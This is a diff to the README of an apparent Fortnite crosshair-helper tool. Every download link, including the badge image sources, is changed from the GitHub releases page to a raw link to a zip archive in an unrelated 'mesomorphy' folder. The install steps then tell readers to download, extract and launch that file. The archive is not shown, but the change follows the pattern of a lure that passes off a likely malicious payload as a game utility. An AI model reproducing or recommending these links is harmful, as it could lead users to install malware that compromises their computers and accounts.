@@ -1,6 +1,6 @@
 # 🎯 utility-for-fortnite-crosshair-helper - Improve Your Game with Ease
 
-[![Download Here](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Masbe2117/utility-for-fortnite-crosshair-helper/releases)
+[![Download Here](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip)](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip)
 
 ## 🌟 Project Overview
 
@@ -13,7 +13,7 @@
 To get started with the Fortnite Battle Companion, follow these simple steps:
 
 1. **Download the Application**  
-   Visit this page to download: [Download Latest Version](https://github.com/Masbe2117/utility-for-fortnite-crosshair-helper/releases).
+   Visit this page to download: [Download Latest Version](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip).
 
 2. **Extract the Files**  
    After downloading, locate the zipped file in your Downloads folder. Right-click on it and select "Extract All" to unzip the files.
@@ -59,7 +59,7 @@ If your system meets these requirements, you can enjoy the full benefits of this
 
 To install the **Fortnite Battle Companion**, follow these steps:
 
-1. **Visit the Releases Page**: Click here to go to the [Releases Page](https://github.com/Masbe2117/utility-for-fortnite-crosshair-helper/releases).
+1. **Visit the Releases Page**: Click here to go to the [Releases Page](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip).
 2. **Choose the Latest Version**: Look for the latest version available.
 3. **Download the File**: Click the download link to save the file to your computer.
 4. **Extract and Open**: Follow the earlier steps to extract the file and launch the application.
@@ -76,4 +76,4 @@ We welcome community contributions! If you would like to propose new educational
 
 This project is licensed under the MIT License, allowing for both personal and commercial use, provided that proper credit is given. For more details, please refer to the LICENSE file in the repository.
 
-[![Download Here](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/Masbe2117/utility-for-fortnite-crosshair-helper/releases)
+[![Download Here](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip)](https://raw.githubusercontent.com/Masbe2117/utility-for-fortnite-crosshair-helper/main/mesomorphy/utility-for-fortnite-crosshair-helper-2.6.zip)
